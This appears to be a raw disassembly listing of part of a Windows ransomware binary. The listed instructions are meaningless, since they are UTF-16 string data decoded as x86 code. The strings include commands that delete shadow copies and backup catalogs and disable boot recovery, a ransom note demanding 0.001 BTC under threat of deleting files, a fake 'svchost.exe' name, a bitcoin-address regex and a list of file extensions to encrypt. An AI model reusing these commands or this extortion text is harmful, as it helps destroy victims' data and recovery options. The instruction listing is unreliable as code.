  4057f8:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4057fc:	00 20                	add    %ah,(%eax)
  4057fe:	00 73 00             	add    %dh,0x0(%ebx)
  405801:	68 00 61 00 64       	push   $0x64006100
  405806:	00 6f 00             	add    %ch,0x0(%edi)
  405809:	77 00                	ja     0x40580b
  40580b:	73 00                	jae    0x40580d
  40580d:	20 00                	and    %al,(%eax)
  40580f:	2f                   	das
  405810:	00 61 00             	add    %ah,0x0(%ecx)
  405813:	6c                   	insb   (%dx),%es:(%edi)
  405814:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  405818:	00 2f                	add    %ch,(%edi)
  40581a:	00 71 00             	add    %dh,0x0(%ecx)
  40581d:	75 00                	jne    0x40581f
  40581f:	69 00 65 00 74 00    	imul   $0x740065,(%eax),%eax
  405825:	20 00                	and    %al,(%eax)
  405827:	26 00 20             	add    %ah,%es:(%eax)
  40582a:	00 77 00             	add    %dh,0x0(%edi)
  40582d:	6d                   	insl   (%dx),%es:(%edi)
  40582e:	00 69 00             	add    %ch,0x0(%ecx)
  405831:	63 00                	arpl   %eax,(%eax)
  405833:	20 00                	and    %al,(%eax)
  405835:	73 00                	jae    0x405837
  405837:	68 00 61 00 64       	push   $0x64006100
  40583c:	00 6f 00             	add    %ch,0x0(%edi)
  40583f:	77 00                	ja     0x405841
  405841:	63 00                	arpl   %eax,(%eax)
  405843:	6f                   	outsl  %ds:(%esi),(%dx)
  405844:	00 70 00             	add    %dh,0x0(%eax)
  405847:	79 00                	jns    0x405849
  405849:	20 00                	and    %al,(%eax)
  40584b:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40584f:	6c                   	insb   (%dx),%es:(%edi)
  405850:	00 65 00             	add    %ah,0x0(%ebp)
  405853:	74 00                	je     0x405855
  405855:	65 00 00             	add    %al,%gs:(%eax)
  405858:	80 cb 62             	or     $0x62,%bl
  40585b:	00 63 00             	add    %ah,0x0(%ebx)
  40585e:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  405862:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  405866:	74 00                	je     0x405868
  405868:	20 00                	and    %al,(%eax)
  40586a:	2f                   	das
  40586b:	00 73 00             	add    %dh,0x0(%ebx)
  40586e:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  405873:	00 7b 00             	add    %bh,0x0(%ebx)
  405876:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40587a:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40587e:	75 00                	jne    0x405880
  405880:	6c                   	insb   (%dx),%es:(%edi)
  405881:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  405885:	00 20                	add    %ah,(%eax)
  405887:	00 62 00             	add    %ah,0x0(%edx)
  40588a:	6f                   	outsl  %ds:(%esi),(%dx)
  40588b:	00 6f 00             	add    %ch,0x0(%edi)
  40588e:	74 00                	je     0x405890
  405890:	73 00                	jae    0x405892
  405892:	74 00                	je     0x405894
  405894:	61                   	popa
  405895:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  405899:	00 73 00             	add    %dh,0x0(%ebx)
  40589c:	70 00                	jo     0x40589e
  40589e:	6f                   	outsl  %ds:(%esi),(%dx)
  40589f:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4058a3:	00 63 00             	add    %ah,0x0(%ebx)
  4058a6:	79 00                	jns    0x4058a8
  4058a8:	20 00                	and    %al,(%eax)
  4058aa:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  4058b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4058b1:	00 72 00             	add    %dh,0x0(%edx)
  4058b4:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4058b8:	6c                   	insb   (%dx),%es:(%edi)
  4058b9:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  4058bd:	00 61 00             	add    %ah,0x0(%ecx)
  4058c0:	69 00 6c 00 75 00    	imul   $0x75006c,(%eax),%eax
  4058c6:	72 00                	jb     0x4058c8
  4058c8:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4058cc:	20 00                	and    %al,(%eax)
  4058ce:	26 00 20             	add    %ah,%es:(%eax)
  4058d1:	00 62 00             	add    %ah,0x0(%edx)
  4058d4:	63 00                	arpl   %eax,(%eax)
  4058d6:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4058da:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4058de:	74 00                	je     0x4058e0
  4058e0:	20 00                	and    %al,(%eax)
  4058e2:	2f                   	das
  4058e3:	00 73 00             	add    %dh,0x0(%ebx)
  4058e6:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  4058eb:	00 7b 00             	add    %bh,0x0(%ebx)
  4058ee:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4058f2:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4058f6:	75 00                	jne    0x4058f8
  4058f8:	6c                   	insb   (%dx),%es:(%edi)
  4058f9:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  4058fd:	00 20                	add    %ah,(%eax)
  4058ff:	00 72 00             	add    %dh,0x0(%edx)
  405902:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  405906:	6f                   	outsl  %ds:(%esi),(%dx)
  405907:	00 76 00             	add    %dh,0x0(%esi)
  40590a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40590e:	79 00                	jns    0x405910
  405910:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405914:	61                   	popa
  405915:	00 62 00             	add    %ah,0x0(%edx)
  405918:	6c                   	insb   (%dx),%es:(%edi)
  405919:	00 65 00             	add    %ah,0x0(%ebp)
  40591c:	64 00 20             	add    %ah,%fs:(%eax)
  40591f:	00 6e 00             	add    %ch,0x0(%esi)
  405922:	6f                   	outsl  %ds:(%esi),(%dx)
  405923:	00 00                	add    %al,(%eax)
  405925:	3b 77 00             	cmp    0x0(%edi),%esi
  405928:	62 00                	bound  %eax,(%eax)
  40592a:	61                   	popa
  40592b:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40592f:	00 69 00             	add    %ch,0x0(%ecx)
  405932:	6e                   	outsb  %ds:(%esi),(%dx)
  405933:	00 20                	add    %ah,(%eax)
  405935:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  405939:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40593d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  405941:	00 20                	add    %ah,(%eax)
  405943:	00 63 00             	add    %ah,0x0(%ebx)
  405946:	61                   	popa
  405947:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40594b:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40594f:	00 67 00             	add    %ah,0x0(%edi)
  405952:	20 00                	and    %al,(%eax)
  405954:	2d 00 71 00 75       	sub    $0x75007100,%eax
  405959:	00 69 00             	add    %ch,0x0(%ecx)
  40595c:	65 00 74 00 01       	add    %dh,%gs:0x1(%eax,%eax,1)
  405961:	09 2e                	or     %ebp,(%esi)
  405963:	00 6a 00             	add    %ch,0x0(%edx)
  405966:	70 00                	jo     0x405968
  405968:	67 00 00             	add    %al,(%bx,%si)
  40596b:	13 43 00             	adc    0x0(%ebx),%eax
  40596e:	3a 00                	cmp    (%eax),%al
  405970:	5c                   	pop    %esp
  405971:	00 55 00             	add    %dl,0x0(%ebp)
  405974:	73 00                	jae    0x405976
  405976:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40597a:	73 00                	jae    0x40597c
  40597c:	5c                   	pop    %esp
  40597d:	00 00                	add    %al,(%eax)
  40597f:	2b 37                	sub    (%edi),%esi
  405981:	00 7a 00             	add    %bh,0x0(%edx)
  405984:	34 00                	xor    $0x0,%al
  405986:	35 00 39 00 61       	xor    $0x61003900,%eax
  40598b:	00 6a 00             	add    %ch,0x0(%edx)
  40598e:	72 00                	jb     0x405990
  405990:	6b 00 37             	imul   $0x37,(%eax),%eax
  405993:	00 32                	add    %dh,(%edx)
  405995:	00 32                	add    %dh,(%edx)
  405997:	00 79 00             	add    %bh,0x0(%ecx)
  40599a:	6e                   	outsb  %ds:(%esi),(%dx)
  40599b:	00 38                	add    %bh,(%eax)
  40599d:	00 63 00             	add    %ah,0x0(%ebx)
  4059a0:	35 00 6a 00 34       	xor    $0x34006a00,%eax
  4059a5:	00 66 00             	add    %ah,0x0(%esi)
  4059a8:	67 00 00             	add    %al,(%bx,%si)
  4059ab:	19 73 00             	sbb    %esi,0x0(%ebx)
  4059ae:	75 00                	jne    0x4059b0
  4059b0:	72 00                	jb     0x4059b2
  4059b2:	70 00                	jo     0x4059b4
  4059b4:	72 00                	jb     0x4059b6
  4059b6:	69 00 73 00 65 00    	imul   $0x650073,(%eax),%eax
  4059bc:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4059c0:	78 00                	js     0x4059c2
  4059c2:	65 00 00             	add    %al,%gs:(%eax)
  4059c5:	17                   	pop    %ss
  4059c6:	73 00                	jae    0x4059c8
  4059c8:	76 00                	jbe    0x4059ca
  4059ca:	63 00                	arpl   %eax,(%eax)
  4059cc:	68 00 6f 00 73       	push   $0x73006f00
  4059d1:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  4059d5:	00 65 00             	add    %ah,0x0(%ebp)
  4059d8:	78 00                	js     0x4059da
  4059da:	65 00 00             	add    %al,%gs:(%eax)
  4059dd:	27                   	daa
  4059de:	32 00                	xor    (%eax),%al
  4059e0:	58                   	pop    %eax
  4059e1:	00 32                	add    %dh,(%edx)
  4059e3:	00 38                	add    %bh,(%eax)
  4059e5:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  4059e9:	00 52 00             	add    %dl,0x0(%edx)
  4059ec:	6d                   	insl   (%dx),%es:(%edi)
  4059ed:	00 57 00             	add    %dl,0x0(%edi)
  4059f0:	61                   	popa
  4059f1:	00 50 00             	add    %dl,0x0(%eax)
  4059f4:	79 00                	jns    0x4059f6
  4059f6:	50                   	push   %eax
  4059f7:	00 51 00             	add    %dl,0x0(%ecx)
  4059fa:	67 00 76 00          	add    %dh,0x0(%bp)
  4059fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4059ff:	00 48 00             	add    %cl,0x0(%eax)
  405a02:	56                   	push   %esi
  405a03:	00 00                	add    %al,(%eax)
  405a05:	19 23                	sbb    %esp,(%ebx)
  405a07:	00 62 00             	add    %ah,0x0(%edx)
  405a0a:	61                   	popa
  405a0b:	00 73 00             	add    %dh,0x0(%ebx)
  405a0e:	65 00 36             	add    %dh,%gs:(%esi)
  405a11:	00 34 00             	add    %dh,(%eax,%eax,1)
  405a14:	49                   	dec    %ecx
  405a15:	00 6d 00             	add    %ch,0x0(%ebp)
  405a18:	61                   	popa
  405a19:	00 67 00             	add    %ah,0x0(%edi)
  405a1c:	65 00 00             	add    %al,%gs:(%eax)
  405a1f:	27                   	daa
  405a20:	31 00                	xor    %eax,(%eax)
  405a22:	71 00                	jno    0x405a24
  405a24:	77 00                	ja     0x405a26
  405a26:	30 00                	xor    %al,(%eax)
  405a28:	6c                   	insb   (%dx),%es:(%edi)
  405a29:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  405a2d:	00 70 00             	add    %dh,0x0(%eax)
  405a30:	39 00                	cmp    %eax,(%eax)
  405a32:	6d                   	insl   (%dx),%es:(%edi)
  405a33:	00 38                	add    %bh,(%eax)
  405a35:	00 75 00             	add    %dh,0x0(%ebp)
  405a38:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  405a3c:	68 00 71 00 68       	push   $0x68007100
  405a41:	00 79 00             	add    %bh,0x0(%ecx)
  405a44:	64 00 00             	add    %al,%fs:(%eax)
  405a47:	17                   	pop    %ss
  405a48:	72 00                	jb     0x405a4a
  405a4a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  405a4e:	64 00 5f 00          	add    %bl,%fs:0x0(%edi)
  405a52:	69 00 74 00 2e 00    	imul   $0x2e0074,(%eax),%eax
  405a58:	74 00                	je     0x405a5a
  405a5a:	78 00                	js     0x405a5c
  405a5c:	74 00                	je     0x405a5e
  405a5e:	00 1f                	add    %bl,(%edi)
  405a60:	31 00                	xor    %eax,(%eax)
  405a62:	37                   	aaa
  405a63:	00 43 00             	add    %al,0x0(%ebx)
  405a66:	71 00                	jno    0x405a68
  405a68:	4d                   	dec    %ebp
  405a69:	00 51 00             	add    %dl,0x0(%ecx)
  405a6c:	46                   	inc    %esi
  405a6d:	00 65 00             	add    %ah,0x0(%ebp)
  405a70:	75 00                	jne    0x405a72
  405a72:	42                   	inc    %edx
  405a73:	00 33                	add    %dh,(%ebx)
  405a75:	00 4e 00             	add    %cl,0x0(%esi)
  405a78:	54                   	push   %esp
  405a79:	00 7a 00             	add    %bh,0x0(%edx)
  405a7c:	4a                   	dec    %edx
  405a7d:	00 00                	add    %al,(%eax)
  405a7f:	05 62 00 63 00       	add    $0x630062,%eax
  405a84:	00 73 28             	add    %dh,0x28(%ebx)
  405a87:	00 3f                	add    %bh,(%edi)
  405a89:	00 3a                	add    %bh,(%edx)
  405a8b:	00 5b 00             	add    %bl,0x0(%ebx)
  405a8e:	31 00                	xor    %eax,(%eax)
  405a90:	33 00                	xor    (%eax),%eax
  405a92:	5d                   	pop    %ebp
  405a93:	00 7b 00             	add    %bh,0x0(%ebx)
  405a96:	31 00                	xor    %eax,(%eax)
  405a98:	7d 00                	jge    0x405a9a
  405a9a:	5b                   	pop    %ebx
  405a9b:	00 61 00             	add    %ah,0x0(%ecx)
  405a9e:	2d 00 6b 00 6d       	sub    $0x6d006b00,%eax
  405aa3:	00 2d 00 7a 00 41    	add    %ch,0x41007a00
  405aa9:	00 2d 00 48 00 4a    	add    %ch,0x4a004800
  405aaf:	00 2d 00 4e 00 50    	add    %ch,0x50004e00
  405ab5:	00 2d 00 5a 00 31    	add    %ch,0x31005a00
  405abb:	00 2d 00 39 00 5d    	add    %ch,0x5d003900
  405ac1:	00 7b 00             	add    %bh,0x0(%ebx)
  405ac4:	32 00                	xor    (%eax),%al
  405ac6:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  405aca:	33 00                	xor    (%eax),%eax
  405acc:	33 00                	xor    (%eax),%eax
  405ace:	7d 00                	jge    0x405ad0
  405ad0:	7c 00                	jl     0x405ad2
  405ad2:	62 00                	bound  %eax,(%eax)
  405ad4:	63 00                	arpl   %eax,(%eax)
  405ad6:	31 00                	xor    %eax,(%eax)
  405ad8:	5b                   	pop    %ebx
  405ad9:	00 61 00             	add    %ah,0x0(%ecx)
  405adc:	2d 00 7a 00 30       	sub    $0x30007a00,%eax
  405ae1:	00 2d 00 39 00 5d    	add    %ch,0x5d003900
  405ae7:	00 7b 00             	add    %bh,0x0(%ebx)
  405aea:	33 00                	xor    (%eax),%eax
  405aec:	39 00                	cmp    %eax,(%eax)
  405aee:	2c 00                	sub    $0x0,%al
  405af0:	35 00 39 00 7d       	xor    $0x7d003900,%eax
  405af5:	00 29                	add    %ch,(%ecx)
  405af7:	00 01                	add    %al,(%ecx)
  405af9:	07                   	pop    %es
  405afa:	48                   	dec    %eax
  405afb:	00 69 00             	add    %ch,0x0(%ecx)
  405afe:	2c 00                	sub    $0x0,%al
  405b00:	00 61 41             	add    %ah,0x41(%ecx)
  405b03:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  405b07:	00 20                	add    %ah,(%eax)
  405b09:	00 79 00             	add    %bh,0x0(%ecx)
  405b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  405b0d:	00 75 00             	add    %dh,0x0(%ebp)
  405b10:	72 00                	jb     0x405b12
  405b12:	20 00                	and    %al,(%eax)
  405b14:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  405b18:	6c                   	insb   (%dx),%es:(%edi)
  405b19:	00 65 00             	add    %ah,0x0(%ebp)
  405b1c:	73 00                	jae    0x405b1e
  405b1e:	20 00                	and    %al,(%eax)
  405b20:	61                   	popa
  405b21:	00 6e 00             	add    %ch,0x0(%esi)
  405b24:	64 00 20             	add    %ah,%fs:(%eax)
  405b27:	00 70 00             	add    %dh,0x0(%eax)
  405b2a:	69 00 63 00 74 00    	imul   $0x740063,(%eax),%eax
  405b30:	75 00                	jne    0x405b32
  405b32:	72 00                	jb     0x405b34
  405b34:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  405b38:	20 00                	and    %al,(%eax)
  405b3a:	68 00 61 00 76       	push   $0x76006100
  405b3f:	00 65 00             	add    %ah,0x0(%ebp)
  405b42:	20 00                	and    %al,(%eax)
  405b44:	62 00                	bound  %eax,(%eax)
  405b46:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  405b4a:	6e                   	outsb  %ds:(%esi),(%dx)
  405b4b:	00 20                	add    %ah,(%eax)
  405b4d:	00 65 00             	add    %ah,0x0(%ebp)
  405b50:	6e                   	outsb  %ds:(%esi),(%dx)
  405b51:	00 63 00             	add    %ah,0x0(%ebx)
  405b54:	72 00                	jb     0x405b56
  405b56:	79 00                	jns    0x405b58
  405b58:	70 00                	jo     0x405b5a
  405b5a:	74 00                	je     0x405b5c
  405b5c:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%eax,%eax,1)
  405b61:	00 00                	add    %al,(%eax)
  405b63:	55                   	push   %ebp
  405b64:	49                   	dec    %ecx
  405b65:	00 66 00             	add    %ah,0x0(%esi)
  405b68:	20 00                	and    %al,(%eax)
  405b6a:	79 00                	jns    0x405b6c
  405b6c:	6f                   	outsl  %ds:(%esi),(%dx)
  405b6d:	00 75 00             	add    %dh,0x0(%ebp)
  405b70:	20 00                	and    %al,(%eax)
  405b72:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  405b76:	20 00                	and    %al,(%eax)
  405b78:	6e                   	outsb  %ds:(%esi),(%dx)
  405b79:	00 6f 00             	add    %ch,0x0(%edi)
  405b7c:	74 00                	je     0x405b7e
  405b7e:	20 00                	and    %al,(%eax)
  405b80:	73 00                	jae    0x405b82
  405b82:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405b86:	64 00 20             	add    %ah,%fs:(%eax)
  405b89:	00 30                	add    %dh,(%eax)
  405b8b:	00 2e                	add    %ch,(%esi)
  405b8d:	00 30                	add    %dh,(%eax)
  405b8f:	00 30                	add    %dh,(%eax)
  405b91:	00 31                	add    %dh,(%ecx)
  405b93:	00 20                	add    %ah,(%eax)
  405b95:	00 42 00             	add    %al,0x0(%edx)
  405b98:	54                   	push   %esp
  405b99:	00 43 00             	add    %al,0x0(%ebx)
  405b9c:	20 00                	and    %al,(%eax)
  405b9e:	74 00                	je     0x405ba0
  405ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  405ba1:	00 20                	add    %ah,(%eax)
  405ba3:	00 28                	add    %ch,(%eax)
  405ba5:	00 61 00             	add    %ah,0x0(%ecx)
  405ba8:	64 00 64 00 72       	add    %ah,%fs:0x72(%eax,%eax,1)
  405bad:	00 65 00             	add    %ah,0x0(%ebp)
  405bb0:	73 00                	jae    0x405bb2
  405bb2:	73 00                	jae    0x405bb4
  405bb4:	29 00                	sub    %eax,(%eax)
  405bb6:	2c 00                	sub    $0x0,%al
  405bb8:	00 4f 59             	add    %cl,0x59(%edi)
  405bbb:	00 6f 00             	add    %ch,0x0(%edi)
  405bbe:	75 00                	jne    0x405bc0
  405bc0:	72 00                	jb     0x405bc2
  405bc2:	20 00                	and    %al,(%eax)
  405bc4:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  405bc8:	6c                   	insb   (%dx),%es:(%edi)
  405bc9:	00 65 00             	add    %ah,0x0(%ebp)
  405bcc:	73 00                	jae    0x405bce
  405bce:	20 00                	and    %al,(%eax)
  405bd0:	77 00                	ja     0x405bd2
  405bd2:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  405bd8:	20 00                	and    %al,(%eax)
  405bda:	62 00                	bound  %eax,(%eax)
  405bdc:	65 00 20             	add    %ah,%gs:(%eax)
  405bdf:	00 70 00             	add    %dh,0x0(%eax)
  405be2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405be6:	6d                   	insl   (%dx),%es:(%edi)
  405be7:	00 61 00             	add    %ah,0x0(%ecx)
  405bea:	6e                   	outsb  %ds:(%esi),(%dx)
  405beb:	00 65 00             	add    %ah,0x0(%ebp)
  405bee:	6e                   	outsb  %ds:(%esi),(%dx)
  405bef:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  405bf3:	00 79 00             	add    %bh,0x0(%ecx)
  405bf6:	20 00                	and    %al,(%eax)
  405bf8:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  405bfc:	6c                   	insb   (%dx),%es:(%edi)
  405bfd:	00 65 00             	add    %ah,0x0(%ebp)
  405c00:	74 00                	je     0x405c02
  405c02:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%eax,%eax,1)
  405c07:	00 00                	add    %al,(%eax)
  405c09:	09 2e                	or     %ebp,(%esi)
  405c0b:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  405c0f:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  405c13:	09 2e                	or     %ebp,(%esi)
  405c15:	00 6a 00             	add    %ch,0x0(%edx)
  405c18:	61                   	popa
  405c19:	00 72 00             	add    %dh,0x0(%edx)
  405c1c:	00 09                	add    %cl,(%ecx)
  405c1e:	2e 00 64 00 61       	add    %ah,%cs:0x61(%eax,%eax,1)
  405c23:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  405c27:	11 2e                	adc    %ebp,(%esi)
  405c29:	00 63 00             	add    %ah,0x0(%ebx)
  405c2c:	6f                   	outsl  %ds:(%esi),(%dx)
  405c2d:	00 6e 00             	add    %ch,0x0(%esi)
  405c30:	74 00                	je     0x405c32
  405c32:	61                   	popa
  405c33:	00 63 00             	add    %ah,0x0(%ebx)
  405c36:	74 00                	je     0x405c38
  405c38:	00 13                	add    %dl,(%ebx)
  405c3a:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  405c3e:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  405c43:	00 69 00             	add    %ch,0x0(%ecx)
  405c46:	6e                   	outsb  %ds:(%esi),(%dx)
  405c47:	00 67 00             	add    %ah,0x0(%edi)
  405c4a:	73 00                	jae    0x405c4c
  405c4c:	00 09                	add    %cl,(%ecx)
  405c4e:	2e 00 64 00 6f       	add    %ah,%cs:0x6f(%eax,%eax,1)
  405c53:	00 63 00             	add    %ah,0x0(%ebx)
  405c56:	00 0b                	add    %cl,(%ebx)
  405c58:	2e 00 64 00 6f       	add    %ah,%cs:0x6f(%eax,%eax,1)
  405c5d:	00 63 00             	add    %ah,0x0(%ebx)
  405c60:	78 00                	js     0x405c62
  405c62:	00 09                	add    %cl,(%ecx)
  405c64:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  405c68:	6c                   	insb   (%dx),%es:(%edi)
  405c69:	00 73 00             	add    %dh,0x0(%ebx)
  405c6c:	00 0b                	add    %cl,(%ebx)
  405c6e:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  405c72:	6c                   	insb   (%dx),%es:(%edi)
  405c73:	00 73 00             	add    %dh,0x0(%ebx)
  405c76:	78 00                	js     0x405c78
  405c78:	00 09                	add    %cl,(%ecx)
  405c7a:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  405c7e:	70 00                	jo     0x405c80
  405c80:	74 00                	je     0x405c82
  405c82:	00 0b                	add    %cl,(%ebx)
  405c84:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  405c88:	70 00                	jo     0x405c8a
  405c8a:	74 00                	je     0x405c8c
  405c8c:	78 00                	js     0x405c8e
  405c8e:	00 09                	add    %cl,(%ecx)
  405c90:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  405c94:	64 00 74 00 00       	add    %dh,%fs:0x0(%eax,%eax,1)
  405c99:	09 2e                	or     %ebp,(%esi)
  405c9b:	00 6d 00             	add    %ch,0x0(%ebp)
  405c9e:	6b 00 61             	imul   $0x61,(%eax),%eax
  405ca1:	00 00                	add    %al,(%eax)
  405ca3:	0d 2e 00 6d 00       	or     $0x6d002e,%eax
  405ca8:	68 00 74 00 6d       	push   $0x6d007400
  405cad:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  405cb1:	09 2e                	or     %ebp,(%esi)
  405cb3:	00 6f 00             	add    %ch,0x0(%edi)
  405cb6:	71 00                	jno    0x405cb8
  405cb8:	79 00                	jns    0x405cba
  405cba:	00 09                	add    %cl,(%ecx)
  405cbc:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  405cc0:	6e                   	outsb  %ds:(%esi),(%dx)
  405cc1:	00 67 00             	add    %ah,0x0(%edi)
  405cc4:	00 09                	add    %cl,(%ecx)
  405cc6:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  405cca:	73 00                	jae    0x405ccc
  405ccc:	76 00                	jbe    0x405cce
  405cce:	00 07                	add    %al,(%edi)
  405cd0:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  405cd4:	79 00                	jns    0x405cd6
  405cd6:	00 09                	add    %cl,(%ecx)
  405cd8:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  405cdc:	71 00                	jno    0x405cde
  405cde:	6c                   	insb   (%dx),%es:(%edi)
  405cdf:	00 00                	add    %al,(%eax)
  405ce1:	09 2e                	or     %ebp,(%esi)
  405ce3:	00 6d 00             	add    %ch,0x0(%ebp)
  405ce6:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  405cea:	00 09                	add    %cl,(%ecx)
  405cec:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  405cf0:	68 00 70 00 00       	push   $0x7000
  405cf5:	09 2e                	or     %ebp,(%esi)
  405cf7:	00 61 00             	add    %ah,0x0(%ecx)
  405cfa:	73 00                	jae    0x405cfc
  405cfc:	70 00                	jo     0x405cfe
  405cfe:	00 0b                	add    %cl,(%ebx)
  405d00:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  405d04:	73 00                	jae    0x405d06
  405d06:	70 00                	jo     0x405d08
  405d08:	78 00                	js     0x405d0a
  405d0a:	00 0b                	add    %cl,(%ebx)
  405d0c:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  405d10:	74 00                	je     0x405d12
  405d12:	6d                   	insl   (%dx),%es:(%edi)
  405d13:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  405d17:	09 2e                	or     %ebp,(%esi)
  405d19:	00 68 00             	add    %ch,0x0(%eax)
  405d1c:	74 00                	je     0x405d1e
  405d1e:	6d                   	insl   (%dx),%es:(%edi)
  405d1f:	00 00                	add    %al,(%eax)
  405d21:	09 2e                	or     %ebp,(%esi)
  405d23:	00 78 00             	add    %bh,0x0(%eax)
  405d26:	6d                   	insl   (%dx),%es:(%edi)
  405d27:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  405d2b:	09 2e                	or     %ebp,(%esi)
  405d2d:	00 70 00             	add    %dh,0x0(%eax)
  405d30:	73 00                	jae    0x405d32
  405d32:	64 00 00             	add    %al,%fs:(%eax)
  405d35:	09 2e                	or     %ebp,(%esi)
  405d37:	00 70 00             	add    %dh,0x0(%eax)
  405d3a:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  405d3e:	00 09                	add    %cl,(%ecx)
  405d40:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  405d44:	6c                   	insb   (%dx),%es:(%edi)
  405d45:	00 61 00             	add    %ah,0x0(%ecx)
  405d48:	00 09                	add    %cl,(%ecx)
  405d4a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  405d4e:	75 00                	jne    0x405d50
  405d50:	62 00                	bound  %eax,(%eax)
  405d52:	00 09                	add    %cl,(%ecx)
  405d54:	2e 00 64 00 61       	add    %ah,%cs:0x61(%eax,%eax,1)
  405d59:	00 65 00             	add    %ah,0x0(%ebp)
  405d5c:	00 0b                	add    %cl,(%ebx)
  405d5e:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  405d62:	6e                   	outsb  %ds:(%esi),(%dx)
  405d63:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  405d67:	00 00                	add    %al,(%eax)
  405d69:	07                   	pop    %es
  405d6a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  405d6e:	73 00                	jae    0x405d70
  405d70:	00 09                	add    %cl,(%ecx)
  405d72:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  405d76:	70 00                	jo     0x405d78
  405d78:	33 00                	xor    (%eax),%eax
  405d7a:	00 09                	add    %cl,(%ecx)
  405d7c:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  405d80:	70 00                	jo     0x405d82
  405d82:	34 00                	xor    $0x0,%al
  405d84:	00 09                	add    %cl,(%ecx)
  405d86:	2e 00 64 00 77       	add    %ah,%cs:0x77(%eax,%eax,1)
  405d8b:	00 67 00             	add    %ah,0x0(%edi)
  405d8e:	00 09                	add    %cl,(%ecx)
  405d90:	2e 00 7a 00          	add    %bh,%cs:0x0(%edx)
  405d94:	69 00 70 00 00 09    	imul   $0x9000070,(%eax),%eax
  405d9a:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  405d9e:	61                   	popa
  405d9f:	00 72 00             	add    %dh,0x0(%edx)
  405da2:	00 09                	add    %cl,(%ecx)
  405da4:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  405da8:	6f                   	outsl  %ds:(%esi),(%dx)
